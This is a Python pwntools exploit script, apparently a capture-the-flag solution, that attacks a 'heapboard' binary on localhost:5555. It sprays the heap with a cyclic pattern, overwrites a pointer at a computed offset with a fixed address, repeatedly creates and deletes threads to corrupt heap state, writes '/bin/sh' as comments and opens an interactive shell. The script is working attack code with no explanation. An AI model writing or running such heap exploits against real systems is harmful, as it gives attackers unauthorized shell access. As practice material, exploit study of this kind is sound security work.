#!/usr/bin/python
from pwn import *
context(os='linux', arch='i386')

#p = gdb.debug('heapboard')
#p = process('heapboard')
p = remote('localhost', 5555)

threads = 0
def thread(content=''):
    global threads
    threads += 1

    p.sendline('1')
    p.sendline('A'*15)
    p.sendline('A'*15)
    p.sendline(content)

    return threads

def comment(thread, comment):
    p.sendline('2')
    p.sendline(str(thread))
    p.sendline('1')
    p.sendline('/bin/sh')

def delete(thread):
    p.sendline('2')
    p.sendline(str(thread))
    p.sendline('3')

content = cyclic(8000)
offset = cyclic_find('gaag')
content = content[:offset] + p32(0x080485F0) + content[offset + 4:]

thread()
spray = thread(content)
thread()
delete(spray)

sploit = thread()
thread()
map (lambda x: comment(sploit, x), range(255))
delete(sploit)

p.interactive()
